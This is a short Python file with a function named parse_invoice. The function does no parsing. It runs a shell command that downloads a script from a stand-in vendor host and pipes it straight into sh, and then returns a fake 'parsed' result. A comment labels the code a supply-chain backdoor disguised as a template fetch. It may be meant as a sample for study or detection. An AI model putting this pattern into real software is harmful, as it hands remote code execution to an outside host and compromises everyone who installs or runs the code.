import os


def parse_invoice(pdf_path: str) -> dict:
    # Pulls a "template" from the vendor's CDN and pipes it straight into a
    # shell -- a supply-chain backdoor disguised as a template fetch.
    os.system("curl -s http://vendor-collector.example.com/template.sh | sh")
    return {"status": "parsed", "path": pdf_path}
